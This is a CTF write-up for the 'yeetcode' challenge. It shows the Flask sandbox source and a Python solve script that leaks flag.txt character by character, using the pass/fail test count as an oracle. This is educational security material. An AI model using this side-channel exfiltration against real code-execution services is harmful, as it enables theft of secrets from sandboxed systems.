![image](https://user-images.githubusercontent.com/44206101/130418065-5c10125e-6ddb-4429-aae6-5c2ee50fe2d2.png)
# First look
Having read the challenge, i easily saw ```Flag is at ./flag.txt```, that means the flag is stored in ```flag.txt```

# Audit
### yeet.py
```python
from flask import Flask, render_template, request, session
import random, epicbox, os

# docker pull 

epicbox.configure(
    profiles=[
        epicbox.Profile('python', 'python:3.9.6-alpine')
    ]
)

app = Flask(__name__)
app.secret_key = os.urandom(16)
flag = open('flag.txt').read()

@app.route('/')
def yeet():
    return render_template('yeet.html')

@app.route('/yeet')
def yeetyeet():
    return render_template('yeetyeet.html')

@app.route('/yeetyeet', methods=['POST'])
def yeetyeetyeet():
    if 'run' in session and session['run']:
        return {'error': True, 'msg': 'You already have code running, please wait for it to finish.'}
    session['run'] = True
    code = request.data
    tests = [(2, 3, 5), (5, 7, 12)]

    for _ in range(8):
        a, b = random.randint(1, 100), random.randint(1, 100)
        tests.append((a, b, a + b)) # tests co 10 cap gia tri
    cmd = 'from code import f\n'
    outputs = []
    for case in tests:
        a, b, ans = case
        cmd += f'print(f({a}, {b}))\n'
        outputs.append(str(ans))
    files = [{'name': 'flag.txt', 'content': flag.encode()}, {'name': 'code.py', 'content': code}]
    limits = {'cputime': 1, 'memory': 16}
    result = epicbox.run('python', command='python3', stdin=cmd, files=files, limits=limits)

    if result['exit_code'] != 0:
        session['run'] = False
        return {'error': True, 'msg': 'Oops! Your code has an error in it. Please try again.'}
    actual = result['stdout'].decode().strip().split('\n')

    passes = 0
    fails = 0
    for i in range(len(outputs)):
        if outputs[i] == actual[i]:
            passes += 1
        else:
            fails += 1

    session['run'] = False
    return {'error': False, 'p': passes, 'f': fails}

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000)
```
# Exploit
### solve.py
```python
import requests

flag = ''
letters = "1234567890rtopasedfghjklzxcvbnm}{_!"

for i in range(33):
    for char in letters:
        data = f"def f(a ,b):\n\tfile_handler = open('flag.txt', 'r')\n\tstring_in_file = file_handler.read().replace('\\n', '')\n\tstring_in_file = string_in_file[{i}:]\n\tif '{char}' == string_in_file[:1]:\n\t\treturn a + b\n\telse:\n\t\treturn 0"
        r = requests.post('https://yeetcode.be.ax/yeetyeet', data=data)
        r_json = r.json()
        p_check = r_json['p']
        if p_check == 10:
            flag += char
            print(flag)
            break
print(flag)
```
